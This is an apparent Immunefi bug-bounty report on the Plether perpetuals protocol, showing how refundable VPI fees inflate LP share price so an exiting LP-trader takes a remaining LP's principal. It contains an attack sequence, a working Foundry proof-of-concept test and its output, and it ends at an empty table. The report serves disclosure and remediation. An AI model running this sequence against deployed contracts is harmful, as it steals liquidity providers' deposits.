# \#98216 [SC-Critical] Refundable VPI counts as redeemable LP value, so an exiting LP takes a remaining LP's principal

**Submitted on Nov 6th 2026 at 01:15:27 UTC by @Cryptor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98216
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

Opening a position into skew charges VPI. That cash is transferred to `HousePool` and recorded as LP revenue, which raises LP net asset value immediately. The same amount stays fully refundable: a skew-reducing close returns up to the position's positive accrued VPI, and the lifetime clamp sets the refund to exactly the accrued amount when the close returns skew to zero.

Nothing keeps that refundable amount out of LP value. The snapshot that prices LP shares counts only trader claims as a liability, so the collected VPI raises the redemption price per share, and the withdrawal budget carries no term for it either. An LP that is also the trader can therefore redeem its share of the revenue while its own position is open, and then collect the whole refund from the pool. The LP that stayed supplies the refund out of its deposited principal.

In the proof of concept the exiting side ends with 130.535261 USDG more than it funded, and the LP that stayed redeems 399,717.104634 USDG against a 400,000 USDG deposit, a loss of 282.895366 USDG of principal. The mark never moves, the pool stays solvent and undegraded, no trader claim is created, and the position is open across three blocks. Every step uses public Router and vault entrypoints.

This is not the depth-amplified rebate described in the repository's own prior scan. An embedded test shows the refund is capped by the lifetime clamp at the accrued amount, so the full-depth quote and the post-exit quote agree to within 0.525867 USDG, and the extraction does not depend on the difference.

## Severity

The LP that stays redeems 399,717.104634 USDG against a 400,000 USDG deposit, so the 282.895366 USDG shortfall comes out of deposited principal. That is the program's Critical impact, direct theft of user funds at rest. The sequence needs no privileged role and no owner action, the mark never moves, and every call goes through public Router and vault entrypoints.

The attacker has to hold more than about 42% of Junior tranche principal, which is where its share of the collected VPI revenue stops covering the two execution fees of the round trip. The boundary is measured below: a 50% share earns 57.992441 USDG and a 40% share loses 14.550415 USDG. The position also has to run close to the skew cap, because accrued VPI grows with the square of skew while the execution fees grow linearly. At the same 60% share, half the size loses 43.546566 USDG.

The mark has to hold for the three blocks the position is open. One basis point against the 380,901.939600 USDG notional costs 38.090194 USDG, so the 130.535261 USDG profit absorbs about 3.4 basis points of adverse movement. The fixture holds the mark fixed and does not price that risk. The keeper can be a third party: the keeper account earns 0.200000 USDG across the cycle, leaving 130.335261 USDG.

One cycle nets the attacker 1.31 basis points of pool assets, and costs the LP cohort 1.52 basis points, the difference being the treasury's fee. Repeating it needs a fresh Junior deposit and the one-hour deposit cooldown before the next redeem request; that repetition is not tested here.

## Vulnerability details

### VPI collection, net asset value, and the refund

An open pays its VPI charge into the pool as revenue, which prices into LP net asset value at once:

```
// packages/perps/src/CfdEngineSettlementSidecar.sol:454
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
```

A close computes VPI from current depth, then clamps it so lifetime VPI cannot go negative. That allows a refund of up to the position's accrued amount:

```
// packages/perps/src/libraries/CloseAccountingLib.sol:107
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The snapshot that prices LP shares counts only trader claims, and a negative terminal delta, as liabilities. Collected VPI therefore lands in `distributable`, which is the value the waterfall hands to LP shares:

```
// packages/perps/src/libraries/HousePoolAccountingLib.sol:63
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    // This form also handles `type(int256).min` without negating it directly.
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}

if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

The withdrawal reservation has three terms, and none of them covers refundable VPI either:

```
// packages/perps/src/libraries/HousePoolAccountingLib.sol:51
snapshot.reserved = engineSnapshot.maxLiabilityAssets + engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.supplementalReservedAssets;
snapshot.freeAssets =
    snapshot.physicalAssets > snapshot.reserved ? snapshot.physicalAssets - snapshot.reserved : 0;
```

`supplementalReservedAssets` is the liability-scaled settlement buffer and nothing else:

```
// packages/perps/src/CfdEngineProtocolLens.sol:67
snapshot.supplementalReservedAssets = SolvencyAccountingLib.settlementBufferTargetAssets(
    snapshot.maxLiabilityAssets, engineContract.settlementBufferBps()
);
```

The refund is then paid out of pool cash free after existing trader claims, with no reference to who owned the pool when the VPI was collected:

```
// packages/perps/src/libraries/CfdEnginePlanLib.sol:973
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
    delta.actionRebateWaivedAssets = delta.actionRebateAssets - delta.actionRebatePaidAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}

// packages/perps/src/CfdEngineSettlementSidecar.sol:621
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

### Value flow

Let `D` be pool assets at the open, `N` the long's notional, `f` the VPI factor, `e` the execution fee rate and `a` the exiting LP's share of Junior principal. The open charges `A = (f/2) * N^2 / D` and that cash becomes pool revenue. The exit prices in `a * A`. The close then refunds `A`, of which the close fee `e * N` is withheld and stays in the pool.

```text
exiting side net       = a*A - 2*e*N
remaining LP net       = -(a*A - e*N)
protocol treasury      = e*N   (the open fee, which bypasses the pool)
```

With the proof of concept's values, `A = 725.429987`, `a = 0.6`, `e*N = 152.360775`:

| Quantity | Predicted | Measured |
|---|---:|---:|
| Exiting side net | +130.536441 | +130.535261 |
| Remaining LP net | -282.897217 | -282.895366 |

The difference of about 0.002 USDG is carry over three transactions plus rounding. The remaining LP's loss is larger than the attacker's gain, because one execution fee leaves to the treasury. The break-even share is `2*e*N / A`, which is 42.0% at this size.

### Root cause

1. `CfdEngineSettlementSidecar.executeOpen` records the whole VPI charge as pool revenue (`src/CfdEngineSettlementSidecar.sol:454`), so it raises redeemable LP net asset value as soon as it is collected.
2. The refund obligation created at the same moment is tracked only on the position's own ledger, as `vpiAccrued` (`src/CfdTypes.sol:41`). The engine keeps no aggregate of positive accrued VPI, so no reservation can be computed from current state.
3. `HousePoolAccountingLib.buildReconcileSnapshot` counts only trader claims, and a negative terminal delta, as liabilities (`src/libraries/HousePoolAccountingLib.sol:60-78`). The collected VPI therefore becomes distributable LP value and raises the share price at the next reconcile, which is the step that pays the exiting LP for it.
4. `buildWithdrawalSnapshot` reserves nothing against it either (`src/libraries/HousePoolAccountingLib.sol:46-55`), and `HousePool` funds the redemption from those free assets (`src/HousePool.sol:842`). At the size used here that reservation is not what admits the attack: free assets are 618,873.235538 USDG, which is pool assets of 1,000,727.429987 less the 380,901.939600 liability and the 952.254849 settlement buffer, against a 600,435.257537 redemption. The share price is the operative defect, and the source-level check below confirms it.
5. The lifetime clamp acts on the position's own VPI ledger and has no visibility into the LP cohort (`src/libraries/CloseAccountingLib.sol:107-118`). Lifetime VPI stays at zero across the attack, so the clamp never fires, because the actor extracts through its LP side.
6. The negative case has a dedicated reserve and the positive case has none. Negative lifetime VPI is backed by a nonwithdrawable trader sub-balance equal to `max(-vpiAccrued, 0)` (`SECURITY.md:866`), with no counterpart on the pool side for `max(vpiAccrued, 0)`.

## Attack scenario

The actor is one address funding one LP account and one trader account. Both are ordinary users.

1. Deposit into Junior through `requestDeposit` and `claimDeposit`, holding at least about 42% of tranche principal.
2. After the one-hour deposit cooldown, call `requestRedeem` for the whole balance. No position exists yet.
3. Once the LP epoch matures, open a near-maximum-skew long through `OrderRouter.commitOrder` and `executeOrder`. The open pays VPI, which the pool records as revenue.
4. Call `OrderRouter.settleLpEpoch`. The redemption is priced against net asset value that now includes the VPI just paid.
5. Call `claimRedeem` to take the redemption as cash.
6. Close the long through the Router, then withdraw the trader balance. The lifetime clamp refunds the full accrued amount, paid from the cash of the LP that stayed.

The position is open from step 3 to step 6, which is three blocks at one unchanged mark. Steps 5 and 6 work in either order: settlement funds the redemption in full, which the proof of concept asserts before the close, and the resulting cash claim does not reprice afterwards (`ACCOUNTING_SPEC.md:733-734`).

## Impact

The remaining LP's deposited principal is reduced. In the proof of concept it deposits 400,000 USDG and redeems 399,717.104634 USDG, with no price movement, no trader claim, no degraded mode and all positions closed. The control test in the same file gives the counterfactual: with the close moved before the exit, and everything else identical, that LP redeems 400,061.154663 USDG, which is above its deposit. The ordering alone moves 344.050029 USDG of the remaining LP's position.

The attacker's gain is smaller than the loss it causes, because one execution fee leaves the pool for the treasury:

| Party | USDG |
|---|---:|
| Exiting LP and trader, funded | 700,000.000000 |
| Exiting LP and trader, final | 700,130.535261 |
| Remaining LP, deposited | 400,000.000000 |
| Remaining LP, redeemed | 399,717.104634 |
| Protocol treasury, open execution fee | 152.360775 |

Scaling is linear in pool size at about 1.31 basis points per cycle, so the same sequence returns about 10 USDG on an 80,000 USDG pool and about 1,300 USDG on a 10,000,000 USDG pool. The capital requirement scales with it, since the attacker must hold about 42% or more of Junior principal. This report does not claim a drain of the pool in a single transaction, and does not test repetition.

## Relation to documented limitations and known issues

- **Repository scan, "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate"** (`audits/scan-plether-fi-plether-core-d4541b49.md:1742`, informational, older commit `d4541b49`). That entry describes lowering depth around a close to magnify the rebate beyond what the unmanipulated curve allows. The extraction here does not use that effect. `test_rebateIsNotDepthAmplified` measures the close quote at full depth before the exit, 724.904120 USDG, and after the exit, 725.429987 USDG. The second value is the accrued amount, because the clamp caps it there. On the raw curve the post-exit close is worth far more than that: at the logged post-exit depth of 400,292.172450 USDG, `(f/2) * N^2 / D` gives 1,812.254868 USDG, and the clamp cuts it to the accrued amount. The full-depth quote sits below the accrued amount only because the charge itself deepened the pool, `A * D / (D + A)` being 724.904121 USDG against the 725.429987 charged. The post-exit quote therefore exceeds the full-depth quote by 0.525867 USDG, or 0.07%, which is 0.4% of the 130.535261 USDG profit. The profit formula above contains no depth term beyond the accrued amount itself. A depth-smoothing change would not stop this sequence.
- **`SECURITY.md:1443`**, "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". The clamp does exactly that here: lifetime VPI ends at zero and the trader extracts nothing from its own round trip. The profit comes from the LP side, which the clamp does not cover.
- **`src/libraries/CloseAccountingLib.sol:112`**, the clamp "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate". The attack needs no net-negative lifetime VPI, so the stated protection does not reach it.
- **`SECURITY.md:872`**, "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV". This excludes anticipated VPI and the trader's own reserve from net asset value. It does not exclude collected VPI that remains refundable, and the proof of concept shows pool assets rise by the full charge at the open and the exiting LP redeems its share of that rise.
- **`ACCOUNTING_SPEC.md:737-740`**, "This intentionally allows a trader and incoming LP to time collection after LP activation and share carry accrued before that activation ... This is a collection-time ownership policy, not a claim that timing cannot transfer part of old carry revenue to a new LP." This accepted case differs on three counts: it concerns carry rather than VPI, it concerns an incoming LP rather than an exiting one, and it transfers revenue rather than reducing another LP's deposited principal.
- **`SECURITY.md:1438`**, "VPI depends on live canonical assets net of outstanding trader claims. Claim payment alone cannot change depth". No trader claim exists at any point in this sequence.



## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:454` (the open records its VPI charge as pool revenue)
- `packages/perps/src/CfdEngineSettlementSidecar.sol:621` (the close pays the refund out of pool cash)
- `packages/perps/src/libraries/CloseAccountingLib.sol:107-118` (close VPI from current depth, and the lifetime clamp)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:973` (the refund is capped only by cash free after trader claims)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1339` (close VPI uses economic pool depth)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:46-55` (`buildWithdrawalSnapshot`, the three reservation terms)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (`buildReconcileSnapshot`, which liabilities reduce distributable LP value)
- `packages/perps/src/HousePool.sol:636` (`recordClaimantInflow` restricts the recapitalization kind to the engine)
- `packages/perps/src/CfdEngineProtocolLens.sol:67` (`supplementalReservedAssets` is the settlement buffer only)
- `packages/perps/src/HousePool.sol:842` (Senior and Junior budgets come from those free assets)
- `packages/perps/src/HousePool.sol:1251` (`getSettlementFreeAssets` reads trader claims from the engine, not the lens)
- `packages/perps/src/CfdTypes.sol:41` (`vpiAccrued`, the only record of the refund obligation)
- `packages/perps/SECURITY.md:866` (dedicated reserve for negative lifetime VPI), `:872` (anticipated VPI and NAV), `:1438`, `:1443` (VPI limitations)
- `packages/perps/ACCOUNTING_SPEC.md:731-740` (collection-time ownership policy for carry)
- `packages/perps/DEPLOYMENT.md:131-143` (release risk parameters), `:154-156` (Senior capacity and seeds)
- `deployments/releases/2026-10-12-perps-arbitrum-sepolia-v1.3.0/oracle-fork/result.json:18` (recorded neutral basket mark)
- `audits/scan-plether-fi-plether-core-d4541b49.md:1742` (prior informational scan entry on depth-amplified close rebates)



## Proof of Concept

## Proof of Concept


The test uses the repository fixture `test/perps/BasePerpTest.sol` with the documented release parameters: 1% VPI factor, 40% skew cap, 20 and 10 basis point initial and maintenance margin, 300 basis point FAD margin and 500 basis point base carry (`DEPLOYMENT.md:131-137`), 1 USDG Senior and Junior seeds (`DEPLOYMENT.md:156`), and Senior capacity of 40,000,000 USDG at 80% (`DEPLOYMENT.md:154-155`). The execution fee measures 4 basis points per side, matching `DEPLOYMENT.md:142`. The mark is 97667164, the neutral basket mark recorded in the signed-Pyth fork replay of the v1.3.0 release (`deployments/releases/2026-10-12-perps-arbitrum-sepolia-v1.3.0/oracle-fork/result.json:18`).

Notes on the fixture:

- `MockPyth` supplies valid price updates and `MockSettlementToken` stands in for USDG. Neither is in scope and no contract in scope is modified.
- The attack path uses no `vm.mockCall`, no `vm.store` and no privileged call. Deposits, redemptions, LP epoch settlement and both orders all run through the public `TrancheVault` and `OrderRouter` entrypoints. The only owner action after deployment is `_setSeniorCapacity` in `setUp`, which installs the release Senior capacity before any of the three parties deposits.
- The mark is identical in every update, so there is no price movement to account for. The test asserts `engine.lastMarkPrice()` is unchanged at the end.
- `MockPyth` charges a zero update fee, so the keeper's oracle fee is zero in the test and L2 gas is not modelled. Three transactions of Arbitrum gas are small against the measured profit, but they are not included.
- The keeper's USDG credits are counted in the exiting side's total and are logged separately, so the result can be read without them.
- The test asserts `degradedMode()` is false and `totalTraderClaimBalanceAssets()` is zero, so the outcome is not degraded-mode or deferred-claim behaviour, and asserts `pool.rawAssets() == pool.totalAssets()`, so pool cash matches its accounting.

Setup:

```
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether
cd audit-comp-plether && git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p packages/perps/test/bounty/goal
```

Save the two test files below in that directory.

File: `packages/perps/test/bounty/goal/VpiNavExitRefundPoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

/// Positive accrued VPI is counted as LP revenue in redeemable NAV while it stays fully refundable to the
/// position. An LP that is also the trader redeems its share of that revenue, then takes the whole refund
/// from the cash of the LP that stayed.
contract VpiNavExitRefundPoC is BasePerpTest {
    address internal constant EXITING_LP = address(0xA11CE);
    address internal constant TRADER = address(0xA02);
    address internal constant REMAINING_LP = address(0xBEEF);
    address internal constant KEEPER = address(0x5EEDED);

    // Recorded neutral basket mark of the deployed oracle configuration, 0.97667164.
    uint256 internal constant MARK = 97_667_164;
    uint256 internal constant SIZE = 390_000e18;
    uint256 internal constant EXITING_LP_PRINCIPAL = 600_000e6;
    uint256 internal constant REMAINING_LP_PRINCIPAL = 400_000e6;
    uint256 internal constant TRADER_PRINCIPAL = 100_000e6;
    uint256 internal constant TRADER_MARGIN = 20_000e6;

    uint256 internal keeperFeeWei;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
        p.fadMarginBps = 300;
        p.baseCarryBps = 500;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
    }

    function _routerOrder(address account, uint256 size, uint256 margin, bool close) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, size, margin, 0, close);
        bytes[] memory data = _mockPythUpdateData(MARK);
        uint256 fee = pletherOracle.getOrderExecutionFee(data);
        keeperFeeWei += fee;
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: fee}(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order did not execute");
    }

    function _settleLpEpochWithMark() internal {
        bytes[] memory markData = _mockPythUpdateData(MARK);
        uint256 markFee = pletherOracle.getUpdateFee(markData);
        keeperFeeWei += markFee;
        vm.deal(KEEPER, markFee);
        vm.prank(KEEPER);
        router.settleLpEpoch{value: markFee}(markData);
    }

    function _fundJuniorThroughRouter(address lp, uint256 amount) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleLpEpochWithMark();
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount);
        vm.prank(lp);
        assertGt(juniorVault.claimDeposit(requestId, amount, lp, lp), 0);
    }

    function _redeemJunior(address lp) internal returns (uint256 assets) {
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(requestId));
        _settleLpEpochWithMark();
        assertEq(juniorVault.claimableRedeemRequest(requestId, lp), shares, "redemption not fully funded");
        vm.prank(lp);
        assets = juniorVault.claimRedeem(requestId, shares, lp, lp);
    }

    function _withdrawClearinghouse(address account) internal {
        uint256 amount = clearinghouse.balanceAssets(account);
        if (amount > 0) {
            vm.prank(account);
            clearinghouse.withdraw(account, amount);
        }
    }

    /// Total USDG held by the exiting LP, its trader account and its keeper, in wallets and in the Clearinghouse.
    function _exitingSideAssets() internal view returns (uint256) {
        return settlementToken.balanceOf(EXITING_LP) + settlementToken.balanceOf(TRADER)
            + settlementToken.balanceOf(KEEPER) + clearinghouse.balanceAssets(TRADER)
            + clearinghouse.balanceAssets(KEEPER);
    }

    /// USDG credited to the protocol treasury, which the Clearinghouse holds outside pool custody.
    function _treasuryAssets() internal view returns (uint256) {
        return clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _fundAllParties() internal returns (uint256 exitingSideStart) {
        _fundJuniorThroughRouter(EXITING_LP, EXITING_LP_PRINCIPAL);
        _fundJuniorThroughRouter(REMAINING_LP, REMAINING_LP_PRINCIPAL);
        _fundTrader(TRADER, TRADER_PRINCIPAL);
        exitingSideStart = EXITING_LP_PRINCIPAL + TRADER_PRINCIPAL;
    }

    function test_lpExitCapturesRefundableVpiAndTakesRemainingLpPrincipal() public {
        uint256 exitingSideStart = _fundAllParties();
        uint256 treasuryStart = _treasuryAssets();

        // The redeem request is placed before any position exists, so the position is open across three
        // blocks at one unchanged mark.
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(EXITING_LP);
        vm.prank(EXITING_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, EXITING_LP, EXITING_LP);
        vm.warp(pool.lpEpochStart(redeemId));

        uint256 poolBeforeOpen = pool.totalAssets();
        _routerOrder(TRADER, SIZE, TRADER_MARGIN, false);
        uint256 openBlock = vm.getBlockNumber();
        uint256 openTime = vm.getBlockTimestamp();
        (,,,,,, int256 accruedVpi) = engine.positions(TRADER);
        assertGt(accruedVpi, 0, "the open must pay positive VPI");
        console2.log("pool assets before the open", poolBeforeOpen);
        console2.log("pool assets after the open", pool.totalAssets());
        console2.logInt(accruedVpi);

        // Full-depth close quote, taken while the pool still holds both LPs' cash.
        ICfdEngineTypes.ClosePreview memory deepPreview = engineLens.previewClose(TRADER, SIZE, MARK);
        console2.logInt(deepPreview.vpiDeltaAssets);
        assertEq(deepPreview.realizedPnlAssets, 0, "no price PnL at an unchanged mark");

        _settleLpEpochWithMark();
        assertEq(juniorVault.claimableRedeemRequest(redeemId, EXITING_LP), shares, "LP exit not fully funded");
        vm.prank(EXITING_LP);
        uint256 redeemed = juniorVault.claimRedeem(redeemId, shares, EXITING_LP, EXITING_LP);
        console2.log("exiting LP principal", EXITING_LP_PRINCIPAL);
        console2.log("exiting LP redeemed", redeemed);
        assertGt(redeemed, EXITING_LP_PRINCIPAL, "the exit prices in a share of the VPI revenue");

        // Same quote after the exit. The lifetime clamp caps both at the accrued amount.
        ICfdEngineTypes.ClosePreview memory shallowPreview = engineLens.previewClose(TRADER, SIZE, MARK);
        console2.logInt(shallowPreview.vpiDeltaAssets);
        console2.log("rebate preview after the exit", shallowPreview.immediatePayoutAssets);
        assertGt(shallowPreview.immediatePayoutAssets, 0, "the close must pay a rebate");

        uint256 poolBeforeClose = pool.totalAssets();
        _routerOrder(TRADER, SIZE, 0, true);
        console2.log("pool assets before the close", poolBeforeClose);
        console2.log("pool assets after the close", pool.totalAssets());
        console2.log("blocks the position was open", vm.getBlockNumber() - openBlock + 1);
        console2.log("seconds the position was open", vm.getBlockTimestamp() - openTime);
        console2.log("keeper USDG credits earned", clearinghouse.balanceAssets(KEEPER));
        console2.log("keeper wei paid for oracle fees", keeperFeeWei);
        console2.log("protocol treasury credit", _treasuryAssets() - treasuryStart);
        assertEq(vm.getBlockNumber() - openBlock + 1, 3, "the position is open across three blocks");

        // The pool is solvent and undegraded throughout, and no claim defers any payout.
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim");
        assertFalse(engine.degradedMode(), "degraded mode must stay off");
        assertEq(engine.lastMarkPrice(), MARK, "the mark never moved");
        assertEq(pool.rawAssets(), pool.totalAssets(), "pool cash equals accounted assets");

        _withdrawClearinghouse(TRADER);
        _withdrawClearinghouse(KEEPER);
        assertEq(clearinghouse.balanceAssets(TRADER), 0, "trader balance withdrawn");

        uint256 exitingSideEnd = _exitingSideAssets();
        console2.log("exiting side funded", exitingSideStart);
        console2.log("exiting side final", exitingSideEnd);
        assertGt(exitingSideEnd, exitingSideStart, "the exiting LP/trader must end with more USDG than it funded");

        uint256 remainingRedeemed = _redeemJunior(REMAINING_LP);
        console2.log("remaining LP principal", REMAINING_LP_PRINCIPAL);
        console2.log("remaining LP redeemed", remainingRedeemed);
        assertLt(remainingRedeemed, REMAINING_LP_PRINCIPAL, "the LP that stayed must lose deposited principal");
    }

    /// Identical deposits and orders, with the close before the LP exit, which removes the transfer.
    function test_control_closeBeforeExitPreservesRemainingLpPrincipal() public {
        uint256 exitingSideStart = _fundAllParties();

        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(EXITING_LP);
        vm.prank(EXITING_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, EXITING_LP, EXITING_LP);
        vm.warp(pool.lpEpochStart(redeemId));

        _routerOrder(TRADER, SIZE, TRADER_MARGIN, false);
        _routerOrder(TRADER, SIZE, 0, true);

        _settleLpEpochWithMark();
        vm.prank(EXITING_LP);
        uint256 redeemed = juniorVault.claimRedeem(redeemId, shares, EXITING_LP, EXITING_LP);
        console2.log("control exiting LP redeemed", redeemed);

        _withdrawClearinghouse(TRADER);
        _withdrawClearinghouse(KEEPER);
        uint256 exitingSideEnd = _exitingSideAssets();
        console2.log("control exiting side funded", exitingSideStart);
        console2.log("control exiting side final", exitingSideEnd);
        assertLt(exitingSideEnd, exitingSideStart, "without the ordering the round trip costs the trader");

        uint256 remainingRedeemed = _redeemJunior(REMAINING_LP);
        console2.log("control remaining LP redeemed", remainingRedeemed);
        assertGe(remainingRedeemed, REMAINING_LP_PRINCIPAL, "the LP that stayed keeps its principal");
    }

    /// The rebate is not a depth-amplified quote: the lifetime clamp caps it at the accrued amount, so the
    /// full-depth and post-exit quotes agree to within a fraction of a basis point.
    function test_rebateIsNotDepthAmplified() public {
        _fundAllParties();

        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        uint256 shares = juniorVault.maxRequestRedeem(EXITING_LP);
        vm.prank(EXITING_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, EXITING_LP, EXITING_LP);
        vm.warp(pool.lpEpochStart(redeemId));

        _routerOrder(TRADER, SIZE, TRADER_MARGIN, false);
        (,,,,,, int256 accruedVpi) = engine.positions(TRADER);
        uint256 deepRebate = uint256(-engineLens.previewClose(TRADER, SIZE, MARK).vpiDeltaAssets);

        _settleLpEpochWithMark();
        vm.prank(EXITING_LP);
        juniorVault.claimRedeem(redeemId, shares, EXITING_LP, EXITING_LP);

        uint256 shallowDepth = pool.totalAssets();
        uint256 shallowRebate = uint256(-engineLens.previewClose(TRADER, SIZE, MARK).vpiDeltaAssets);
        console2.log("accrued VPI", uint256(accruedVpi));
        console2.log("full-depth rebate quote", deepRebate);
        console2.log("post-exit rebate quote", shallowRebate);
        console2.log("pool depth after the exit", shallowDepth);

        assertEq(shallowRebate, uint256(accruedVpi), "the clamp caps the rebate at the accrued amount");
        assertLe(shallowRebate - deepRebate, deepRebate / 1000, "the two quotes agree within 10 basis points");
    }
}
```

Command:

```
cd packages/perps && forge test --match-path 'test/bounty/goal/VpiNavExitRefundPoC.t.sol' -vv
```

Output:

```
Ran 3 tests for test/bounty/goal/VpiNavExitRefundPoC.t.sol:VpiNavExitRefundPoC
[PASS] test_control_closeBeforeExitPreservesRemainingLpPrincipal() (gas: 7145236)
Logs:
  control exiting LP redeemed 600091731997
  control exiting side funded 700000000000
  control exiting side final 699786484373
  control remaining LP redeemed 400061154663

[PASS] test_lpExitCapturesRefundableVpiAndTakesRemainingLpPrincipal() (gas: 7620544)
Logs:
  pool assets before the open 1000002000000
  pool assets after the open 1000727429987
  725429987
  -724904120
  exiting LP principal 600000000000
  exiting LP redeemed 600435257537
  -725429987
  rebate preview after the exit 573069212
  pool assets before the close 400292172450
  pool assets after the close 399719103964
  blocks the position was open 3
  seconds the position was open 2
  keeper USDG credits earned 200000
  keeper wei paid for oracle fees 0
  protocol treasury credit 152360775
  exiting side funded 700000000000
  exiting side final 700130535261
  remaining LP principal 400000000000
  remaining LP redeemed 399717104634

[PASS] test_rebateIsNotDepthAmplified() (gas: 5389200)
Logs:
  accrued VPI 725429987
  full-depth rebate quote 724904120
  post-exit rebate quote 725429987
  pool depth after the exit 400292172450

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 56.46ms (90.70ms CPU time)
```

Reading the output: the pool holds 1,000,002.000000 USDG, the open pays 725.429987 USDG of VPI, and pool assets rise by exactly that amount. The full-depth close quote is already 724.904120 USDG. Settlement then prices the exiting LP's redemption at 600,435.257537 USDG against a 600,000 USDG deposit, so it collects 435.257537 USDG of the revenue it just paid in. The close refunds the full 725.429987 USDG, of which 573.069212 USDG reaches the trader after the close fee, and pool assets fall from 400,292.172450 to 399,719.103964 USDG. The position was open across three blocks, which the test asserts, and two seconds of block time. The protocol treasury is credited 152.360775 USDG, one execution fee, across the whole cycle. The exiting side ends with 700,130.535261 USDG against 700,000 USDG funded, including 0.200000 USDG of keeper credits, and the LP that stayed redeems 399,717.104634 USDG against its 400,000 USDG deposit. In the control, where only the ordering differs, the exiting side ends below what it funded and the LP that stayed redeems 400,061.154663 USDG, above its deposit.

### Additional validation

`packages/perps/test/bounty/goal/VpiNavExitRefundVariants.t.sol` extends the test above and runs the same cycle at other splits and sizes. It inherits the three tests above, so the suite runs six.

| Exiting LP share of Junior | Long notional (USDG) | Accrued VPI (USDG) | Exiting side net (USDG) | Remaining LP net (USDG) |
|---|---:|---:|---:|---:|
